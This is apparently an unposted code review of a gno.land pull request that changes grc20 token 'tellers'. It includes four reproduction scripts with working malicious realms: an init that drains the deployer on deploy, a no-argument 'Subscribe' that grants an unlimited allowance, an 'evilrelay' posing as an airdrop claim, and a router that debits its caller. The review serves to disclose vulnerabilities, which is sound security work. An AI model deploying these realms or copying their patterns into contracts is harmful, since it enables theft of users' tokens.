<!-- NOT FOR POSTING: superseded by head 310f9c1ab, which moves UserTeller back to *PrivateLedger. -->

# Review: [#6123](https://github.com/gnolang/gno/pull/6123)
Event: REQUEST_CHANGES

## Body
`MsgAddPackage` walks the user-teller gate, so a newly deployed realm's `init(cur realm)` moves the deploying account's whole balance inside the deploy transaction. [`tellers.gno:39`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L39) requires a direct `MsgCall` and [`pr6123_grc20_eoa_entrypoints.md`](https://github.com/gnolang/gno/blob/16f54a89c/gno.land/adr/pr6123_grc20_eoa_entrypoints.md?plain=1#L44-L45) records `MsgRun` and stale frames as the refused shapes, so what makes `MsgRun` opaque, source the signer cannot read at signing time, holds for a `-pkgdir` nobody named there.

## examples/gno.land/p/demo/tokens/grc20/tellers.gno:152-155 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L152-L155) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L152)
A newly deployed realm's `init(cur realm)` moves the deploying account's whole balance, because [`IsUserCall()`](https://github.com/gnolang/gno/blob/16f54a89c/gnovm/stdlibs/chain/runtime/frame.gno#L105-L107) is true for any frame with an empty `pkgPath` and an `init` under `MsgAddPackage` presents one. [`tellers.gno:39`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L39) requires a direct `MsgCall` and the [ADR](https://github.com/gnolang/gno/blob/16f54a89c/gno.land/adr/pr6123_grc20_eoa_entrypoints.md?plain=1#L44-L45) records `MsgRun` and stale frames as the refused shapes, so `MsgAddPackage` is named in neither.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > gno.land/pkg/integration/testdata/zz_addpkg_init.txtar <<'TXTAR'
loadpkg gno.land/p/demo/tokens/grc20
loadpkg gno.land/r/test/vtok $WORK/vtok

adduser alice

gnoland start

gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'

gnokey maketx call -pkgpath gno.land/r/test/vtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
stdout '1000000 int64'

# One MsgAddPackage. The signing view carries a package path and a source
# directory, no token, no amount and no recipient.
gnokey maketx addpkg -pkgdir $WORK/initdrain -pkgpath gno.land/r/alice/initdrain -gas-fee 1000000ugnot -gas-wanted 20000000 -chainid=tendermint_test alice
stdout OK

gnokey query vm/qeval --data "gno.land/r/alice/initdrain.Report()"
# stdout 'moved'                      # IS:     the gate that names MsgCall admits MsgAddPackage
stdout 'refused: user teller requires a direct EOA call (MsgCall)'  # SHOULD: only the message type the gate names passes
gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
# stdout '0 int64'
stdout '1000000 int64'             # SHOULD: deploying a package moves none of the deployer's tokens

-- vtok/gnomod.toml --
module = "gno.land/r/test/vtok"
gno = "0.9"

-- vtok/vtok.gno --
package vtok

import "gno.land/p/demo/tokens/grc20"

var (
	Token *grc20.Token
	adm   *grc20.PrivateLedger
)

func init(cur realm) {
	Token, adm = grc20.NewToken("Victim", "VTOK", 4, 0, cur)
}

func Faucet(cur realm) {
	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
		panic(err)
	}
}

func BalanceOf(owner address) int64 { return Token.BalanceOf(owner) }

-- initdrain/gnomod.toml --
module = "gno.land/r/alice/initdrain"
gno = "0.9"

-- initdrain/initdrain.gno --
package initdrain

import "gno.land/r/test/vtok"

var Result string

// init runs while the deploying account is still the previous frame, so
// UserTeller resolves the deployer as the actor.
func init(cur realm) {
	victim := cur.Previous().Address()
	amount := vtok.Token.BalanceOf(victim)
	err := vtok.Token.UserTeller().Transfer(0, cur, address("g14we3n6qtzjz6z9u2l070zmr4av080t940kamgl"), amount)
	if err != nil {
		Result = "refused: " + err.Error()
		return
	}
	Result = "moved"
}

func Report() string { return Result }
TXTAR
go test -run 'TestTestdata/zz_addpkg_init' ./gno.land/pkg/integration/
rm gno.land/pkg/integration/testdata/zz_addpkg_init.txtar
```

The script asserts that the deploy is refused, and the assertion fails because the deploying account's whole balance moved inside the deploy transaction. `adduser` mints a fresh mnemonic per run, so the deployer's address below is one run's value.

```
> gnokey maketx addpkg -pkgdir $WORK/initdrain -pkgpath gno.land/r/alice/initdrain ... alice
OK!
EVENTS: [{"type":"Transfer","attrs":[{"key":"token","value":"gno.land/r/test/vtok.VTOK.0000000"},{"key":"from","value":"g1a5qg9drtjgssm8926v3kzk0qy7hj7f036k5r6j"},{"key":"to","value":"g14we3n6qtzjz6z9u2l070zmr4av080t940kamgl"},{"key":"value","value":"1000000"}],"pkg_path":"gno.land/p/demo/tokens/grc20"},{"bytes_delta":2873,"fee_delta":{"denom":"ugnot","amount":287300},"pkg_path":"gno.land/r/alice/initdrain"}]
> gnokey query vm/qeval --data "gno.land/r/alice/initdrain.Report()"
data: ("moved" string)
> stdout 'refused: user teller requires a direct EOA call (MsgCall)'
FAIL: testdata/zz_addpkg_init.txtar:23: no match for `refused: user teller requires a direct EOA call (MsgCall)` found in stdout
```

Testscript stops there, so the balance assertion below it is not reached; it reads `0 int64` on a run with both `SHOULD` lines replaced by their `IS` values.
</details>

## examples/gno.land/p/demo/tokens/grc20/tellers.gno:186-189 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L186-L189) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L186)
`Approve` behind this gate checks the frame and nothing about the amount or the lifetime, so one signed call writes a `MaxInt64` allowance owned by the signer that [`RealmTeller`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L79-L95) then spends as the grantee from any later frame and any later signer, and the holder cannot list it, since the only allowance read is [`Allowance(owner, spender)`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/token.gno#L151) and it needs the spender up front. The [ADR's Consequences](https://github.com/gnolang/gno/blob/16f54a89c/gno.land/adr/pr6123_grc20_eoa_entrypoints.md?plain=1#L36-L40) bounds the model to a transfer or an approval inside that one call, and authority outliving it is absent from that paragraph.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > gno.land/pkg/integration/testdata/zz_approve_persists.txtar <<'TXTAR'
loadpkg gno.land/p/demo/tokens/grc20
loadpkg gno.land/r/test/ptok $WORK/ptok
loadpkg gno.land/r/test/dapp $WORK/dapp
loadpkg gno.land/r/test/latermid $WORK/latermid

adduser alice
adduser bob

gnoland start

gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'
gnokey maketx send -send 50000000ugnot -to $bob_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'

gnokey maketx call -pkgpath gno.land/r/test/ptok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/ptok.BalanceOf(\"$alice_user_addr\")"
stdout '1000000 int64'

# The one transaction alice signs: dapp.Subscribe(), no arguments. It moves no
# tokens, so nothing in the receipt or the balance shows what it granted.
gnokey maketx call -pkgpath gno.land/r/test/dapp -func Subscribe -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/ptok.BalanceOf(\"$alice_user_addr\")"
stdout '1000000 int64'
gnokey query vm/qeval --data "gno.land/r/test/ptok.AllowanceToDapp(\"$alice_user_addr\")"
stdout '9223372036854775807 int64'

# Route 1: a transaction bob signs. alice is not the origin and signs nothing.
gnokey maketx call -pkgpath gno.land/r/test/dapp -func Sweep -args $alice_user_addr -args 400000 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test bob
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/ptok.BalanceOf(\"$alice_user_addr\")"
# stdout '600000 int64'    # IS:     a transaction alice did not sign moves her balance after her single direct call
stdout '1000000 int64' # SHOULD: the authority a direct MsgCall carries ends with that call

# Route 2: an intermediate realm, which UserTeller itself refuses.
gnokey maketx call -pkgpath gno.land/r/test/latermid -func Relay -args $alice_user_addr -args 300000 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test bob
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/ptok.BalanceOf(\"$alice_user_addr\")"
stdout '300000 int64'

# Route 3: MsgRun, which UserTeller itself refuses.
gnokey maketx run -gas-fee 1000000ugnot -gas-wanted 20_000_000 -chainid=tendermint_test bob $WORK/run/sweep.gno
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/ptok.BalanceOf(\"$alice_user_addr\")"
stdout '0 int64'
gnokey query vm/qeval --data "gno.land/r/test/dapp.Take()"
stdout '1000000 int64'

-- ptok/gnomod.toml --
module = "gno.land/r/test/ptok"
gno = "0.9"

-- ptok/ptok.gno --
package ptok

import (
	"chain"

	"gno.land/p/demo/tokens/grc20"
)

var (
	Token *grc20.Token
	adm   *grc20.PrivateLedger
)

func init(cur realm) {
	Token, adm = grc20.NewToken("PersistTok", "PTOK", 4, 0, cur)
}

func Faucet(cur realm) {
	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
		panic(err)
	}
}

func BalanceOf(owner address) int64 { return Token.BalanceOf(owner) }

// AllowanceToDapp is the only way to see the grant, and it needs the spender's
// address up front: *Token exposes no way to list an owner's allowances.
func AllowanceToDapp(owner address) int64 {
	return Token.Allowance(owner, chain.PackageAddress("gno.land/r/test/dapp"))
}

-- dapp/gnomod.toml --
module = "gno.land/r/test/dapp"
gno = "0.9"

-- dapp/dapp.gno --
package dapp

import (
	"chain"

	"gno.land/r/test/ptok"
)

func self() address { return chain.PackageAddress("gno.land/r/test/dapp") }

var subscriber address

// Subscribe is what the signing user sees: one function, no arguments, no
// token, no amount, no spender. UserTeller resolves the actor from the direct
// MsgCall frame, so the approval is written as alice.
func Subscribe(cur realm) {
	subscriber = cur.Previous().Address()
	if err := ptok.Token.UserTeller().Approve(0, cur, self(), 9223372036854775807); err != nil {
		panic(err)
	}
}

// Sweep spends the standing allowance as this realm. RealmTeller sets no
// userOnly flag, so guardWrite lets it through from any frame and any signer.
func Sweep(cur realm, owner address, amount int64) {
	if err := ptok.Token.RealmTeller(0, cur).TransferFrom(0, cur, owner, self(), amount); err != nil {
		panic(err)
	}
}

// SweepStored is the same spend reached without naming the owner, so a MsgRun
// script needs no address literal.
func SweepStored(cur realm, amount int64) {
	Sweep(cross(cur), subscriber, amount)
}

func Take() int64 { return ptok.Token.BalanceOf(self()) }

-- latermid/gnomod.toml --
module = "gno.land/r/test/latermid"
gno = "0.9"

-- latermid/latermid.gno --
package latermid

import "gno.land/r/test/dapp"

func Relay(cur realm, owner address, amount int64) {
	dapp.Sweep(cross(cur), owner, amount)
}

-- run/sweep.gno --
package main

import "gno.land/r/test/dapp"

func main(cur realm) {
	dapp.SweepStored(cross(cur), 300000)
}
TXTAR
go test -run 'TestTestdata/zz_approve_persists' ./gno.land/pkg/integration/
rm gno.land/pkg/integration/testdata/zz_approve_persists.txtar
```

The script asserts the balance a holder keeps after the one transaction she signed, `dapp.Subscribe()` with no arguments, and the assertion fails on a later transaction she is not in.

```
> gnokey query vm/qeval --data "gno.land/r/test/ptok.AllowanceToDapp(\"$alice_user_addr\")"
data: (9223372036854775807 int64)
> gnokey maketx call -pkgpath gno.land/r/test/dapp -func Sweep -args $alice_user_addr -args 400000 ... bob
OK!
> gnokey query vm/qeval --data "gno.land/r/test/ptok.BalanceOf(\"$alice_user_addr\")"
data: (600000 int64)
> stdout '1000000 int64' # SHOULD: the authority a direct MsgCall carries ends with that call
FAIL: testdata/zz_approve_persists.txtar:35: no match for `1000000 int64` found in stdout
```

Testscript stops there, so the two routes below it are not reached; on a run with the `SHOULD` line replaced by its `IS` value the intermediate realm and the `MsgRun` script take the rest, and the balance reads `0 int64`.
</details>

## examples/gno.land/p/demo/tokens/grc20/tellers.gno:200-203 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L200-L203) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/tellers.gno#L200)
`TransferFrom` resolves the spender from the frame, so a realm the holder calls directly also spends allowances a third party granted that holder, moving a balance the third party never exposed to that realm. The [ADR's bounds paragraph](https://github.com/gnolang/gno/blob/16f54a89c/gno.land/adr/pr6123_grc20_eoa_entrypoints.md?plain=1#L42-L46) covers the user's own tokens reached through a public `Token` pointer, and a third party's balance is not that.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > gno.land/pkg/integration/testdata/zz_unbounded_relay.txtar <<'TXTAR'
loadpkg gno.land/p/demo/tokens/grc20
loadpkg gno.land/r/demo/defi/grc20reg
loadpkg gno.land/r/test/vtok $WORK/vtok
loadpkg gno.land/r/test/evilrelay $WORK/evilrelay

adduser alice
adduser carol

gnoland start

gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'
gnokey maketx send -send 50000000ugnot -to $carol_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'

# alice and carol each hold 1000000 VTOK.
gnokey maketx call -pkgpath gno.land/r/test/vtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey maketx call -pkgpath gno.land/r/test/vtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test carol
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
stdout '1000000 int64'

# carol allows alice 400000, the ordinary allowance route.
gnokey maketx call -pkgpath gno.land/r/demo/defi/grc20reg -func UserApprove -args gno.land/r/test/vtok.VTOK -args $alice_user_addr -args 400000 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test carol
stdout OK

# The relay holds nothing before alice signs.
gnokey query vm/qeval --data "gno.land/r/test/evilrelay.Take()"
stdout '0 int64'

# alice signs one MsgCall: pkgpath gno.land/r/test/evilrelay, func Claim, no
# arguments. The signing view names no token, no amount and no recipient.
gnokey maketx call -pkgpath gno.land/r/test/evilrelay -func Claim -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK

gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
stdout '0 int64'
gnokey query vm/qeval --data "gno.land/r/test/evilrelay.Take()"
stdout '1000000 int64'

# The same call spends the allowance carol granted alice, because UserTeller
# resolves the SPENDER from the frame too.
gnokey maketx call -pkgpath gno.land/r/test/evilrelay -func ClaimBonus -args $carol_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$carol_user_addr\")"
# stdout '600000 int64'  # IS:     one call the holder signs spends an allowance a third party granted her
stdout '1000000 int64' # SHOULD: an allowance carol granted alice is spendable only by alice, as herself
gnokey query vm/qeval --data "gno.land/r/test/evilrelay.Take()"
stdout '1400000 int64'

# Claim also left the relay a standing allowance on alice, which no wallet
# screen showed her.
gnokey query vm/qeval --data "gno.land/r/test/vtok.AllowanceOfRelay(\"$alice_user_addr\")"
stdout '9223372036854775807 int64'

# carol sends alice 100000 later on.
gnokey maketx call -pkgpath gno.land/r/demo/defi/grc20reg -func UserTransfer -args gno.land/r/test/vtok.VTOK -args $alice_user_addr -args 100000 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test carol
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
stdout '100000 int64'

# The relay takes it in a transaction carol signs, with alice absent: the
# standing allowance outlives the one call alice made.
gnokey maketx call -pkgpath gno.land/r/test/evilrelay -func Sweep -args $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test carol
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
stdout '0 int64'
gnokey query vm/qeval --data "gno.land/r/test/evilrelay.Take()"
stdout '1500000 int64'

-- vtok/gnomod.toml --
module = "gno.land/r/test/vtok"
gno = "0.9"

-- vtok/vtok.gno --
package vtok

import (
	"chain"

	"gno.land/p/demo/tokens/grc20"
	"gno.land/r/demo/defi/grc20reg"
)

var (
	token *grc20.Token
	adm   *grc20.PrivateLedger
)

// The token realm names no relay and grants nothing. Register is the only
// thing it does beyond minting.
func init(cur realm) {
	token, adm = grc20.NewToken("VictimTok", "VTOK", 4, 0, cur)
	grc20reg.Register(cross(cur), token, "")
}

func Faucet(cur realm) {
	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
		panic(err)
	}
}

func BalanceOf(owner address) int64 { return token.BalanceOf(owner) }

func AllowanceOfRelay(owner address) int64 {
	return token.Allowance(owner, chain.PackageAddress("gno.land/r/test/evilrelay"))
}

-- evilrelay/gnomod.toml --
module = "gno.land/r/test/evilrelay"
gno = "0.9"

-- evilrelay/evilrelay.gno --
package evilrelay

import (
	"chain"
	"math"

	"gno.land/r/demo/defi/grc20reg"
)

const key = "gno.land/r/test/vtok.VTOK"

// Claim advertises itself as an airdrop claim: a plain crossing function with
// no parameters, so a wallet shows the signer "evilrelay.Claim()". This realm
// imports only the registry; vtok has never heard of it.
func Claim(cur realm) {
	tok := grc20reg.MustGet(key)
	victim := cur.Previous().Address()
	me := cur.Address()
	if bal := tok.BalanceOf(victim); bal > 0 {
		if err := tok.UserTeller().Transfer(0, cur, me, bal); err != nil {
			panic(err)
		}
	}
	// Standing authority, so the next balance the victim receives is takeable
	// without her signing anything again.
	if err := tok.UserTeller().Approve(0, cur, me, math.MaxInt64); err != nil {
		panic(err)
	}
}

// ClaimBonus spends an allowance a third party granted the SIGNING USER: the
// user is the spender the teller resolves from the frame.
func ClaimBonus(cur realm, owner address) {
	tok := grc20reg.MustGet(key)
	amt := tok.Allowance(owner, cur.Previous().Address())
	if amt == 0 {
		return
	}
	if err := tok.UserTeller().TransferFrom(0, cur, owner, cur.Address(), amt); err != nil {
		panic(err)
	}
}

// Sweep draws on the standing allowance as the relay itself. Anyone can sign
// it; the victim is not in the transaction.
func Sweep(cur realm, victim address) {
	tok := grc20reg.MustGet(key)
	bal := tok.BalanceOf(victim)
	if bal == 0 {
		return
	}
	grc20reg.TransferFrom(0, cur, key, victim, cur.Address(), bal)
}

func Take() int64 {
	return grc20reg.MustGet(key).BalanceOf(chain.PackageAddress("gno.land/r/test/evilrelay"))
}
TXTAR
go test -run 'TestTestdata/zz_unbounded_relay' ./gno.land/pkg/integration/
rm gno.land/pkg/integration/testdata/zz_unbounded_relay.txtar
```

The script asserts the balance carol keeps after granting alice 400,000 through the ordinary `UserApprove` route, and the assertion fails on a call only alice signed, into a realm carol never transacted with. `adduser` mints a fresh mnemonic per run, so the addresses below are one run's values.

```
> gnokey maketx call -pkgpath gno.land/r/test/evilrelay -func ClaimBonus -args $carol_user_addr ... alice
OK!
EVENTS: [{"type":"Transfer","attrs":[{"key":"token","value":"gno.land/r/test/vtok.VTOK.0000000"},{"key":"from","value":"g1l7z39n7g4z0xkr49arhwcmrwqwzggajqfjqatj"},{"key":"to","value":"g1htfr8aef53jqljj3gut64dwnsjry4l0f0k0hm5"},{"key":"value","value":"400000"}],"pkg_path":"gno.land/p/demo/tokens/grc20"}]
> gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$carol_user_addr\")"
data: (600000 int64)
> stdout '1000000 int64' # SHOULD: an allowance carol granted alice is spendable only by alice, as herself
FAIL: testdata/zz_unbounded_relay.txtar:48: no match for `1000000 int64` found in stdout
```

Testscript stops there, so the lines below it are not reached; on a run with the `SHOULD` line replaced by its `IS` value the relay holds `1400000 int64`. The whole script fails to load against the `examples/` tree at the merge base, where `tok.UserTeller` is undefined:

```
gno.land/r/test/evilrelay/evilrelay.gno:20:17: tok.UserTeller undefined (type *grc20.Token has no field or method UserTeller)
gno.land/r/test/evilrelay/evilrelay.gno:26:16: tok.UserTeller undefined (type *grc20.Token has no field or method UserTeller)
gno.land/r/test/evilrelay/evilrelay.gno:39:16: tok.UserTeller undefined (type *grc20.Token has no field or method UserTeller)
```
</details>

## examples/gno.land/p/demo/tokens/grc20/types.gno:166-169 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/types.gno#L166-L169) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/p/demo/tokens/grc20/types.gno#L166)
This doc tells every public entry point that accepts a `Teller` to validate it here first, and [line 167](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/types.gno#L167) adds `UserTeller` to the set that passes, so a realm holding a teller a stranger enrolled pays out of whoever calls that realm next rather than out of the enroller. The [ADR's Consequences](https://github.com/gnolang/gno/blob/16f54a89c/gno.land/adr/pr6123_grc20_eoa_entrypoints.md?plain=1#L36-L40) bounds the model to a realm the user invokes directly, and a realm validating a stranger's teller is not that.

<details><summary>repro</summary>

```bash
# from a local clone of gnolang/gno:
gh pr checkout 6123 -R gnolang/gno
cat > gno.land/pkg/integration/testdata/zz_canonical_debits_caller.txtar <<'TXTAR'
loadpkg gno.land/p/demo/tokens/grc20
loadpkg gno.land/r/test/rtok $WORK/rtok
loadpkg gno.land/r/test/router $WORK/router
loadpkg gno.land/r/test/sponsor $WORK/sponsor

adduser alice
adduser bob

gnoland start

gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
stdout 'OK!'

gnokey maketx call -pkgpath gno.land/r/test/rtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey maketx call -pkgpath gno.land/r/test/sponsor -func Fund -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/rtok.BalanceOf(\"$alice_user_addr\")"
stdout '500000 int64'
gnokey query vm/qeval --data "gno.land/r/test/rtok.SponsorBalance()"
stdout '500000 int64'

# The sponsor registers its teller. The router runs IsCanonicalTeller and the
# value passes, because UserTeller is canonical.
gnokey maketx call -pkgpath gno.land/r/test/sponsor -func Enroll -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/router.Enrolled()"
stdout 'true bool'

# alice asks the router to pay bob 100 out of the sponsor. She names a recipient
# and an amount and never names a payer.
gnokey maketx call -pkgpath gno.land/r/test/router -func Payout -args $bob_user_addr -args 100 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
stdout OK
gnokey query vm/qeval --data "gno.land/r/test/rtok.SponsorBalance()"
stdout '500000 int64'
gnokey query vm/qeval --data "gno.land/r/test/rtok.BalanceOf(\"$alice_user_addr\")"
# stdout '499900 int64'    # IS:     a canonical teller held by an honest router debits the router's direct caller
stdout '500000 int64' # SHOULD: IsCanonicalTeller clearing a value means that value cannot debit the validating realm's caller
gnokey query vm/qeval --data "gno.land/r/test/rtok.BalanceOf(\"$bob_user_addr\")"
stdout '100 int64'

-- rtok/gnomod.toml --
module = "gno.land/r/test/rtok"
gno = "0.9"

-- rtok/rtok.gno --
package rtok

import (
	"chain"

	"gno.land/p/demo/tokens/grc20"
)

var (
	Token *grc20.Token
	adm   *grc20.PrivateLedger
)

func init(cur realm) {
	Token, adm = grc20.NewToken("RouterTok", "RTOK", 4, 0, cur)
}

func Faucet(cur realm) {
	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
		panic(err)
	}
}

func BalanceOf(owner address) int64 { return Token.BalanceOf(owner) }

func SponsorBalance() int64 {
	return Token.BalanceOf(chain.PackageAddress("gno.land/r/test/sponsor"))
}

-- router/gnomod.toml --
module = "gno.land/r/test/router"
gno = "0.9"

-- router/router.gno --
package router

import "gno.land/p/demo/tokens/grc20"

var stored grc20.Teller

// Enroll accepts a teller from an external caller behind the canonicity check
// the grc20 package documents for exactly this position.
func Enroll(cur realm, t grc20.Teller) {
	if !grc20.IsCanonicalTeller(t) {
		panic("router: not a canonical teller")
	}
	stored = t
}

func Enrolled() bool { return stored != nil }

// Payout pays `to` out of the enrolled sponsor. Every teller a foreign realm
// could enroll before this branch debited the enroller or nobody.
func Payout(cur realm, to address, amount int64) {
	if err := stored.Transfer(0, cur, to, amount); err != nil {
		panic(err)
	}
}

-- sponsor/gnomod.toml --
module = "gno.land/r/test/sponsor"
gno = "0.9"

-- sponsor/sponsor.gno --
package sponsor

import (
	"chain"

	"gno.land/r/test/router"
	"gno.land/r/test/rtok"
)

// Fund moves half of the caller's balance into the sponsor, so the sponsor has
// something a payout could plausibly come out of.
func Fund(cur realm) {
	self := chain.PackageAddress("gno.land/r/test/sponsor")
	if err := rtok.Token.UserTeller().Transfer(0, cur, self, 500_000); err != nil {
		panic(err)
	}
}

// Enroll hands the router a UserTeller. Nothing here is privileged.
func Enroll(cur realm) {
	router.Enroll(cross(cur), rtok.Token.UserTeller())
}
TXTAR
go test -run 'TestTestdata/zz_canonical_debits_caller' ./gno.land/pkg/integration/
rm gno.land/pkg/integration/testdata/zz_canonical_debits_caller.txtar
```

The script asserts that a payout the router makes out of its enrolled sponsor leaves the caller's balance alone, and the assertion fails because the caller paid.

```
> gnokey query vm/qeval --data "gno.land/r/test/router.Enrolled()"
data: (true bool)
> gnokey maketx call -pkgpath gno.land/r/test/router -func Payout -args $bob_user_addr -args 100 ... alice
OK!
> gnokey query vm/qeval --data "gno.land/r/test/rtok.SponsorBalance()"
data: (500000 int64)
> gnokey query vm/qeval --data "gno.land/r/test/rtok.BalanceOf(\"$alice_user_addr\")"
data: (499900 int64)
> stdout '500000 int64' # SHOULD: IsCanonicalTeller clearing a value means that value cannot debit the validating realm's caller
FAIL: testdata/zz_canonical_debits_caller.txtar:38: no match for `500000 int64` found in stdout
```

Testscript stops there, so the recipient's balance assertion under it is not reached; it reads `100 int64` on a run with the `SHOULD` line replaced by its `IS` value. The package's own [`tellers_test.gno:46`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/p/demo/tokens/grc20/tellers_test.gno#L46) pins that a user teller clears the check.
</details>

## examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno:333 [gh](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L333) · [↗](../../../../../.worktrees/gno-review-6123/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L333)
Missing test: `UserTransfer`, `UserApprove` and `UserTransferFrom` reach no test in this package, while the added test re-asserts the actor binding [`TestWrappersBindActorToCallingRealm`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L249) and [`TestTransferFromSpendsAllowanceGrantedToCallingRealm`](https://github.com/gnolang/gno/blob/16f54a89c/examples/gno.land/r/demo/defi/grc20reg/grc20reg_test.gno#L303) already hold on functions this branch does not touch, and `testing.NewUserRealm` gives `cur.Previous().IsUserCall()` in the unit harness, so the happy path and the refusals belong in this file, not only in a booted chain.

<details><summary>test cases</summary>

```go
package grc20reg

import (
	"testing"

	"gno.land/p/demo/tokens/grc20"
	"gno.land/p/nt/testutils/v0"
	"gno.land/p/nt/uassert/v0"
	"gno.land/p/nt/urequire/v0"
)

// TestUserHelpersActAsTheSigningUser walks all three helpers on a token that
// did nothing but register, then the intermediate-realm refusal, so the actor
// binding and the userOnly gate sit side by side in the package's own suite.
func TestUserHelpersActAsTheSigningUser(cur realm, t *testing.T) {
	const tokenPath = "gno.land/r/demo/token_user_helpers"

	alice := testutils.TestAddress("alice")
	bob := testutils.TestAddress("bob")
	carol := testutils.TestAddress("carol")

	testing.SetRealm(testing.NewCodeRealm(tokenPath))
	token, ledger := grc20.NewToken("UserHelpers", "UHLP", 4, 0, cur)
	urequire.NoError(t, ledger.Mint(alice, 1_000))
	tokenKey := Register(cross(cur), token, "")

	testing.SetRealm(testing.NewUserRealm(alice))
	UserTransfer(cross(cur), tokenKey, bob, 100)
	UserApprove(cross(cur), tokenKey, carol, 300)

	testing.SetRealm(testing.NewUserRealm(carol))
	UserTransferFrom(cross(cur), tokenKey, alice, bob, 200)

	uassert.Equal(t, int64(700), token.BalanceOf(alice))
	uassert.Equal(t, int64(300), token.BalanceOf(bob))
	uassert.Equal(t, int64(100), token.Allowance(alice, carol))

	// An intermediate realm frame cannot shift the actor onto the user.
	testing.SetRealm(testing.NewCodeRealm("gno.land/r/demo/user_helper_relay"))
	uassert.AbortsContains(t, cur, "user teller requires a direct EOA call", func() {
		UserTransfer(cross(cur), tokenKey, bob, 1)
	})
	uassert.AbortsContains(t, cur, "user teller requires a direct EOA call", func() {
		UserApprove(cross(cur), tokenKey, bob, 1)
	})
